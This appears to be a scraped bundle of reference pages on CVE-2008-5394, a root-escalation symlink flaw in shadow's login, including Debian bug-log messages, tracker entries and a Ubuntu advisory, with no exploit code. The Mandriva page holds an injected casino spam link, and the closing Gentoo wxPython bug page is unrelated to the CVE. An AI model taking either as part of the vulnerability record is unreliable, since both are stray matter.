to `Adeodato Simó <adeodato@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 09 Feb 2009 22:36:03 GMT) ([full text](bugreport.cgi?bug=505271;msg=214), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=214), [link](#213)).

---

[Message #215](#215) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=215), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=215), reply):

![](/cgi-bin/libravatar.cgi?email=adeodato%40debian.org)
From: Adeodato Simó <adeodato@debian.org>
To: Paul Szabo <psz@maths.usyd.edu.au>, 500518@bugs.debian.org,
505271@bugs.debian.org
Subject: Re: Bug#500518: closed by Ian Beckwith <ianb@erislabs.net>
(Bug#500518: fixed in linux-ftpd-ssl 0.17.18+0.3-6etch1)
Date: Mon, 9 Feb 2009 23:34:16 +0100
```
Dear Paul,

yes, you could say these duplicate messages are due to some
"maintenance" procedures. When bugs get fixed in the stable
distribution, they first get uploaded to a "staging area" called
proposed-updates where users can fetch them from if they are in need of
them; at that point you get the first copy of the message.

After some weeks, when we accumulate enough fixes in that staging area,
we move the fixes to the stable release itself; the software that does
the move sends at that point a second copy of the e-mail. I'm not very
sure if this is a feature of a bug, but it's just the way it is. :-)

---
> Dear Ian,
> Thanks for closing the bug! Except I got the exact same message
> on 4 Jan already, so am puzzled by this duplication.

> Dear Nicolas,
> This latest "closed" message: is that a repeat message, a bug in some
> maintenance procedures? I am sure we had 4.0.18.1-7+etch1 for a long
> time now...

--
Adeodato Simó                                     dato at net.com.org.es
Debian Developer                                  adeodato at debian.org

- Why are you whispering?
- Because I just think that no matter where she is, my mom can hear this
  conversation.
                -- Rory and Lane

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Mon, 09 Feb 2009 23:57:05 GMT) ([full text](bugreport.cgi?bug=505271;msg=217), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=217), [link](#216)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 09 Feb 2009 23:57:05 GMT) ([full text](bugreport.cgi?bug=505271;msg=219), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=219), [link](#218)).

---

[Message #220](#220) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=220), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=220), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: Paul Szabo <psz@maths.usyd.edu.au>, 505271@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505271: closed by Nicolas FRANCOIS
(Nekral) <nicolas.francois@centraliens.net> (Bug#505271: fixed in
shadow 1:4.0.18.1-7+etch1)
Date: Tue, 10 Feb 2009 00:55:50 +0100
```
On Tue, Feb 10, 2009 at 09:19:20AM +1100, psz@maths.usyd.edu.au wrote:
> Dear Nicolas,
>
> This latest "closed" message: is that a repeat message, a bug in some
> maintenance procedures? I am sure we had 4.0.18.1-7+etch1 for a long
> time now...

I have no idea what triggered this second email (first closure for stable
was on 01-060)

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Tue, 10 Feb 2009 00:21:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=222), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=222), [link](#221)).

---

**Acknowledgement sent**
to `Luk Claes <luk@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 10 Feb 2009 00:21:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=224), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=224), [link](#223)).

---

[Message #225](#225) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=225), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=225), reply):

![](/cgi-bin/libravatar.cgi?email=luk%40debian.org)
From: Luk Claes <luk@debian.org>
To: 505271@bugs.debian.org
Cc: Paul Szabo <psz@maths.usyd.edu.au>
Subject: Re: Bug#505271: [Pkg-shadow-devel] Bug#505271: closed by Nicolas
FRANCOIS (Nekral) <nicolas.francois@centraliens.net> (Bug#505271: fixed in
shadow 1:4.0.18.1-7+etch1)
Date: Tue, 10 Feb 2009 01:20:12 +0100
```
Nicolas François wrote:
> On Tue, Feb 10, 2009 at 09:19:20AM +1100, psz@maths.usyd.edu.au wrote:
>> Dear Nicolas,
>>
>> This latest "closed" message: is that a repeat message, a bug in some
>> maintenance procedures? I am sure we had 4.0.18.1-7+etch1 for a long
>> time now...
>
> I have no idea what triggered this second email (first closure for stable
> was on 01-060)

Probably the recent stable point release from today?

Cheers

Luk

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Tue, 10 Mar 2009 07:36:08 GMT) ([full text](bugreport.cgi?bug=505271;msg=227), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=227), [link](#226)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=505271).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sat Jan 25 15:17:56 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from www.mandriva.com_687c7aef_20250125_151807.html ===


* [Tuxedo.org](https://tuxedo.org/ "Go to: Tuxedo")
* Store
* Mandriva Linux
* Enterprise Solutions
* Contact Us
* Language ![](/sites/all/themes/mandriva_customer/images/arrow-grey-bottom.gif)
  + English (International)
  + Français
  + Ð ÑÑÑÐºÐ¸Ð¹

# [Mandriva](/mandriva/)

* Download
* Mandriva Linux
* Community
* Help

## One

### The Linux desktopthat's easy to try and easy to keep

Download
![Mandriva One](/sites/all/themes/mandriva_customer/images/front/packshot_Mandriva_One.png)

## Powerpack

### Mandriva Linux- and more

Download
![Mandriva Linux Powerpack](/sites/all/themes/mandriva_customer/images/front/en-49.png)

## Mandriva Flash

### The mobile and installable Linux desktopon a USB key

Buy on Store
![Mandriva Flash](/sites/all/themes/mandriva_customer/images/front/mandriva-flash2.png)

### [Community](community)

* User Forums
* Support - FAQ
* Free Software
* Become a member

### Enterprise Solutions

* Enterprise Linux Products
* Asset Management Solution
* Professional Services
* Support & Maintenance

* Go to site »

### Mandriva Partners

* Worldwide offices
* Partner Program
* Technology Partners
* OEM
* Classmate PC with Mandriva Linux

### News

* Mandriva presents the launch of its new mobile desktop: Mandriva Flash 2008 Spring
* Speaking about Mandriva Linux 2008 Spring in media
* Speaking about Mandriva Linux 2008 Spring in media
* Mandriva presents its latest distribution: Mandriva Linux 2008 Spring
* Mandriva and Novatice Technologies present Edutice, The ready to use solution dedicated to educationand multimedia spaces
* # [Top 50 Online Casinos UK in 2023](https://montycasinos.com/online-casinos/)

more

* Download
  + Mandriva Linux 2008
  + Writing an ISO image
* Mandriva Linux
  + One
  + Powerpack
  + Mandriva Flash
* Community
  + Start
  + Register
  + Stay informed
  + Participate
  + Free software
* Help
  + Getting help
  + Knowledge Base
  + Documentation
  + Forums
  + Support Requests
  + Customer Care
  + Enterprise Support
* Enterprise Solutions
  + Products
  + Support
  + Services
  + Partners
  + Go to site »

Language
English (International)
Français
Ð ÑÑÑÐºÐ¸Ð¹

* © 2007 Mandriva S.A.
* About Us
* Legal Information
* Privacy Policy
* Contact Us



=== Content from launchpad.net_e89b4f60_20250126_094922.html ===

[Log in / Register](https://launchpad.net/ubuntu/%2Bsource/shadow/1%3A4.0.13-7ubuntu3.4/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[shadow package](https://launchpad.net/ubuntu/%2Bsource/shadow)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/shadow)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/shadow)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/shadow)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/shadow)

# shadow 1:4.0.13-7ubuntu3.4 source package in Ubuntu

## Changelog

```
shadow (1:4.0.13-7ubuntu3.4) dapper-security; urgency=low

  * SECURITY UPDATE: root privilege escalation via utmp group.
    - debian/patches/303_login_symlink_attack: upstream fix thanks
      to Paul Szabo and Nicolas François.

 -- Kees Cook <email address hidden>   Mon, 08 Dec 2008 00:36:57 -0800
```

## Upload details

Uploaded by:
[Kees Cook](/~kees)
on 2008-12-08

Uploaded to:
[Dapper](/ubuntu/dapper)

Original maintainer:
[Shadow package maintainers](/~pkg-shadow-devel)

Architectures:
any

Section:
admin

Urgency:
Low Urgency

## [See full publishing history](%2Bpublishinghistory) Publishing

| Series | Pocket | Published | Component | Section |
| --- | --- | --- | --- | --- |

## Builds

[Dapper](/ubuntu/dapper):
![[FULLYBUILT]](/@@/build-success "Successfully built")
[amd64](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/808281)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[hppa](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/808282)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[i386](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/808283)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[ia64](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/808284)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[powerpc](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/808285)
![[FULLYBUILT]](/@@/build-success "Successfully built")
[sparc](/~ubuntu-security/%2Barchive/ubuntu/ppa/%2Bbuild/808286)

## Downloads

| File | Size | SHA-256 Checksum |
| --- | --- | --- |
| [shadow\_4.0.13.orig.tar.gz](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/shadow/1%3A4.0.13-7ubuntu3.4/shadow_4.0.13.orig.tar.gz) | 1.5 MiB | 7678db5fb23a9537f8976248538103d9aa66d06d02d0076f6a68f062322ffc41 |
| [shadow\_4.0.13-7ubuntu3.4.diff.gz](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/shadow/1%3A4.0.13-7ubuntu3.4/shadow_4.0.13-7ubuntu3.4.diff.gz) | 200.7 KiB | 059ce4b7e831cdd2167f4d6f50bb0c8975618944b35f1db1ecc0f01605357b3a |
| [shadow\_4.0.13-7ubuntu3.4.dsc](https://launchpad.net/ubuntu/%2Barchive/primary/%2Bsourcefiles/shadow/1%3A4.0.13-7ubuntu3.4/shadow_4.0.13-7ubuntu3.4.dsc) | 931 bytes | 860f5d91a9b58e433e5ad1831c211e0458a00695329b08355beeacfa1afd814d |

### Available diffs

* [diff from 1:4.0.13-7ubuntu3.3 to 1:4.0.13-7ubuntu3.4](http://launchpadlibrarian.net/20536521/shadow_1%3A4.0.13-7ubuntu3.3_1%3A4.0.13-7ubuntu3.4.diff.gz) (847 bytes)

[View changes file](http://launchpadlibrarian.net/20536520/shadow_4.0.13-7ubuntu3.4_source.changes)

## Binary packages built by this source

[login](/ubuntu/dapper/%2Bpackage/login):
No summary available for login in ubuntu dapper.

No description available for login in ubuntu dapper.

[passwd](/ubuntu/dapper/%2Bpackage/passwd):
No summary available for passwd in ubuntu dapper.

No description available for passwd in ubuntu dapper.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from lists.ubuntu.com_be8ed54b_20250126_094923.html ===


| **ubuntu-hardened -- Ubuntu security discussion** | |
| --- | --- |
|  | |
| **About ubuntu-hardened** | English (USA)   Chinese (Taiwan) |
| Discussion on Ubuntu security updates, development of new security technologies, and general "hardening" of the operating system.  A place to talk about MAC systems (SELinux, AppArmor, Smack) in Ubuntu, about both kernel-level and user-land security improvements and technologies, etc.  To see the collection of prior postings to the list, visit the [ubuntu-hardened Archives](https://lists.ubuntu.com/archives/ubuntu-hardened). | |
| **Using ubuntu-hardened** | |
| To post a message to all the list members, send email to ubuntu-hardened@lists.ubuntu.com. You can subscribe to the list, or change your existing subscription, in the sections below. | |
| **Subscribing to ubuntu-hardened** | |
| Subscribe to ubuntu-hardened by filling out the following form. You will be sent email requesting confirmation, to prevent others from gratuitously subscribing you. This is a hidden list, which means that the list of members is available only to the list administrator.    | Your email address: |  |  | | --- | --- | --- | | Your name (optional): |  |  | | You may enter a privacy password below. This provides only mild security, but should prevent others from messing with your subscription. **Do not use a valuable password** as it will occasionally be emailed back to you in cleartext. If you choose not to enter a password, one will be automatically generated for you, and it will be sent to you once you've confirmed your subscription. You can always request a mail-back of your password when you edit your personal options. | | | | Pick a password: |  |  | | Reenter password to confirm: |  |  | | Which language do you prefer to display your messages? | English (USA)   Chinese (Taiwan) |  | | Would you like to receive list mail batched in a daily digest? | No  Yes | |  | | | | |

| **ubuntu-hardened Subscribers** | |
| (*The subscribers list is only available to the list administrator.*) Enter your admin address and password to visit the subscribers list: Admin address: Password:  To unsubscribe from ubuntu-hardened, get a password reminder, or change your subscription options enter your subscription email address: If you leave the field blank, you will be prompted for your email address | |

---

[ubuntu-hardened](../listinfo/ubuntu-hardened) list run by jamie at ubuntu.com, mdeslaur at ubuntu.com, sbeattie at ubuntu.com, alex.murray at canonical.com
[ubuntu-hardened administrative interface](../admin/ubuntu-hardened) (requires authorization)
[Overview of all lists.ubuntu.com mailing lists](../listinfo)

| [Delivered by Mailmanversion 2.1.20](http://www.gnu.org/software/mailman/index.html) | [Python Powered](http://www.python.org/) | [GNU's Not Unix](http://www.gnu.org/) | [Debian Powered](http://www.debian.org/) |
| --- | --- | --- | --- |

[![](http://tuxedo-es.org/images/hardened_debian.png)](http://www.debian-hardened.org)



=== Content from security-tracker.debian.org_f0708628_20250126_094921.html ===

# CVE-2008-5394

| **Name** | CVE-2008-5394 |
| --- | --- |
| **Description** | /bin/login in shadow 4.0.18.1 in Debian GNU/Linux, and probably other Linux distributions, allows local users in the utmp group to overwrite arbitrary files via a symlink attack on a temporary file referenced in a line (aka ut\_line) field in a utmp entry. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2008-5394) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2008-5394); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2008-5394), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2008-5394), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2008-5394), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2008-5394), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2008-5394), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2008-5394), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2008-5394), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2008-5394)/[CVE](https://www.suse.com/security/cve/CVE-2008-5394/), GitHub [advisories](https://github.com/advisories?query=CVE-2008-5394)/[code](https://github.com/search?type=Code&q=%22CVE-2008-5394%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2008-5394%22), [web search](https://duckduckgo.com/html?q=%22CVE-2008-5394%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **References** | [DSA-1709-1](/tracker/DSA-1709-1) |
| **Debian Bugs** | [505271](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=505271) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [shadow](/tracker/source-package/shadow) ([PTS](https://tracker.debian.org/pkg/shadow)) | bullseye | 1:4.8.1-1 | fixed |
|  | bookworm | 1:4.13+dfsg1-1 | fixed |
|  | sid, trixie | 1:4.16.0-7 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [shadow](/tracker/source-package/shadow) | source | etch | 1:4.0.18.1-7+etch1 |  | [DSA-1709-1](/tracker/DSA-1709-1) |  |
| [shadow](/tracker/source-package/shadow) | source | (unstable) | 1:4.1.1-6 |  |  | [505271](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=505271) |

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from www.ubuntu.com_8e27d14d_20250125_151810.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-695-1: shadow vulnerability

18 December 2008

shadow vulnerability

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 8.10](/security/notices?release=intrepid)
* [Ubuntu 8.04](/security/notices?release=hardy)
* [Ubuntu 7.10](/security/notices?release=gutsy)
* [Ubuntu 6.06](/security/notices?release=dapper)

## Packages

* [shadow](/security/cves?package=shadow) -

## Details

Paul Szabo discovered a race condition in login. While setting up

tty permissions, login did not correctly handle symlinks. If a local

attacker were able to gain control of the system utmp file, they could

cause login to change the ownership and permissions on arbitrary files,

leading to a root privilege escalation.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 8.10

* [login](https://launchpad.net/ubuntu/%2Bsource/shadow)
  -
  [1:4.1.1-1ubuntu1.2](https://launchpad.net/ubuntu/%2Bsource/shadow/1%3A4.1.1-1ubuntu1.2)

##### Ubuntu 8.04

* [login](https://launchpad.net/ubuntu/%2Bsource/shadow)
  -
  [1:4.0.18.2-1ubuntu2.2](https://launchpad.net/ubuntu/%2Bsource/shadow/1%3A4.0.18.2-1ubuntu2.2)

##### Ubuntu 7.10

* [login](https://launchpad.net/ubuntu/%2Bsource/shadow)
  -
  [1:4.0.18.1-9ubuntu0.2](https://launchpad.net/ubuntu/%2Bsource/shadow/1%3A4.0.18.1-9ubuntu0.2)

##### Ubuntu 6.06

* [login](https://launchpad.net/ubuntu/%2Bsource/shadow)
  -
  [1:4.0.13-7ubuntu3.4](https://launchpad.net/ubuntu/%2Bsource/shadow/1%3A4.0.13-7ubuntu3.4)

In general, a standard system upgrade is sufficient to effect the

necessary changes.

## References

* [CVE-2008-5394](/security/CVE-2008-5394)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from bugs.gentoo.org_a3d3daea_20250126_094926.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Bug 25132
wxPython-2.4.1.2 emerge fails
Last modified: 2003-09-28 03:38:36 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=25132&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=25132&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 25132**](show_bug.cgi?id=25132)
- wxPython-2.4.1.2 emerge fails

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
wxPython-2.4.1.2 emerge fails

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED NEEDINFO | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Linux | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Linux "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | New packages ([show other bugs](buglist.cgi?component=New%20packages&product=Gentoo%20Linux&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | Highest normal | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Alastair Tse (RETIRED) | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2003-07-23 12:08 UTC by P. Schnell | | --- | --- | | Modified: | 2003-09-28 03:38 UTC ([History](show_activity.cgi?id=25132)) | | CC List: | 2 users (show)  grandmasterlinux python | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") |  | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | |
